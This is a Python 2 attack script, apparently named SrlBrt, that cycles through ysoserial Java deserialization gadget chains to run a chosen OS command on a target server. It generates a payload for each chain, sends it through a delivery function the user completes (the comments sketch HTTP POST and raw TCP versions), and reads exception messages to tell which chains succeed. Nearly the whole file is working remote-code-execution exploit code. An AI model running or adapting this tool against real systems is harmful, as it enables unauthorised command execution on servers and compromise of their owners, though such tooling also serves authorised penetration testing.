import os
import requests
import subprocess
import sys

#Ysoserial JAR path
YSOSERIAL_PATH = "ysoserial.jar"

#Default runtime options
gadget = ""
target = ""
cmd = ""

####################
# dispatchPayload(target, payloadbytes)
# 
# Modify this function to deliver a payload to the target. If the target returns exceptions
# in response to unexpected data then this function should return the response after
# delivering the payload so that launchAttack() can attempt to verify availability of POP
# gadget chains and OS commands.
# 
# Note that the payload bytes supplied to this function include the serialization header
# bytes 0xAC ED 00 05. Use payloadbytes[4:] to strip those off if they're not needed.
# 
# Examples:
#	Use the requests library to dispatch the payload in the body of a POST request:
#		return requests.post(target, data=payloadbytes)
# 
#	Inject the payload into a TCP stream
#		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#		s.connect((target.split(":")[0], target.split(":")[1]))
#		s.send("\xac\xed\x00\x05\x77\x02\x00\x00")
#		s.recv(1024)
#		s.recv(1024)
#		s.send(paylodbytes[4:])
#		response = s.recv(1024)
#		return response
####################
def dispatchPayload(target, payloadbytes):
	raise NotImplementedError("dispatchPayload method not implemented.")

####################
# Launch attack and check for helpful exceptions in the response
####################
def launchAttack(payload):
	global target
	
	#Dispatch the payload and get the response
	response = dispatchPayload(target, payload)
	
	#Check for ClassNotFound exceptions in the response
	if "ClassNotFoundException" in response:
		print "  [-] POP gadget chain not supported."
	elif "java.io.IOException: Cannot run program" in response:
		print "  [+] POP gadget chain is supported"
		print "  [-] Requested command is not available"
	elif response == "":
		print "  [-] No response, unable to detect gadget/command availability"
	else:
		print "  [+] POP gadget chain may be supported."

####################
# SrlBrt
# Grab command line parameters, restrict the gadget chain to use if necessary,
# then generate payloads and pass them through launchAttack.
####################
#Grab command line parameters
if len(sys.argv) < 3 or len(sys.argv) > 4:
	print "Usage: SrlBrt.py [gadget] <target> <cmd>"
	sys.exit(1)
if len(sys.argv) == 3:
	#SrlBrt.py <target> <cmd>
	target = sys.argv[1]
	cmd = sys.argv[2]
else:
	#SrlBrt.py <gadget> <target> <cmd>
	gadget = sys.argv[1]
	target = sys.argv[2]
	cmd = sys.argv[3]

#Gadget chains to generate
gadgetChains = ["BeanShell1", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2",
				"CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "Groovy1",
				"CommonsCollections6", "JavassistWeld1", "JBossInterceptors1", "Jdk7u21", "JSON1",
				"MozillaRhino1", "ROME", "Spring1", "Spring2"
]
if gadget != "":
	gadgetChains = [gadget]

#Attempt to attack the server with each available gadget chain
print "Starting attack..."
for g in gadgetChains:
	print "  Trying POP gadget chain: " + g
	print "  [+] Generating payload..."
	with open(os.devnull, "w") as FNULL:
		payload = subprocess.check_output(["java", "-jar", YSOSERIAL_PATH, g, cmd], stderr=FNULL)
	print "  [+] Payload generated, launching attack..."
	launchAttack(payload)
	if raw_input("  Attack successful? (y/n) [n]: ").lower() == "y":
		break
	print ""
